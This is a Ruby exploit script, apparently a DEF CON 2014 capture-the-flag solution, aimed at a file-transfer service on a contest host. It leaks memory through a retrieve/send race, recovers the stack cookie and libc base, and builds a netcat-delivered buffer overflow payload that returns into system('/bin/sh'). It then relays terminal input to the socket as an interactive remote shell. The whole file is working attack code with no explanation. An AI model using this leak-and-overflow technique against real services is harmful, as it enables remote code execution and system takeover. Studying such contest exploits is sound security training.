require 'socket'

def itos(i)
        result = ""
        4.times do |x|
                result += "\\x%02X"% (i & 0xff)
                i >>= 8
        end
        return result
end

#print itos(0x12345678)

#host = 'localhost'
#port = 11115
host = 'sftp_bf28442aa4ab1a4089ddca16729b29ac.2014.shallweplayaga.me'
port = 115
s = TCPSocket.new(host, port)
s.puts("PASS defcon2014")
puts s.readline
s.puts("RETR ./freetime")
p s.read(1)
puts "[*] First chance"
STDIN.readline()
s.puts("SEND")
x = s.read(0x62e)
ret = x.index("\xf8\x9b\x04\x08")
stack_cookie =  x[ret-16..ret-13].unpack('<I')[0]
#libc_base = x[1368..1368+3].unpack('<I')[0] - 0x000193E9
#system = libc_base + 0x0003F430
#bin_sh = libc_base + 0x161D98
libc_base = x[1368..1368+3].unpack('<I')[0] - 0x19999
system = libc_base + 0x403B0
bin_sh = libc_base + 0x1615A4
puts "[*] stack cookie : %08X" % stack_cookie
puts "[*] system : %08X" % system
puts "[*] /bin/sh : %08X" % bin_sh

puts "(python -c'print\"PASS defcon2014\\nKILL ./freetime\\nSTOR APP ./freetime\\nSIZE 0\\nLIST V ./\\n\"';cat;python -c'print\"STOR APP ./freetime\\nSIZE 941\\n\"+\"a\"*44+\"\\x37\"+\"A\"*868+\"%s\"+\"x\"*12+\"%sCCCC%s\"+\"LIST V ./\"')|nc %s %d" % [itos(stack_cookie), itos(system), itos(bin_sh), host, port]

puts "[*] Delete file"
STDIN.readline()
s.puts ("RETR ./freetime")
p s.read(1)
puts "[*] Change file"
STDIN.readline()
s.puts("SEND")


# when get shell
Thread.new do |t|
        loop do
                print s.read(1)
        end
end

loop do
        s.puts(STDIN.readline())
end
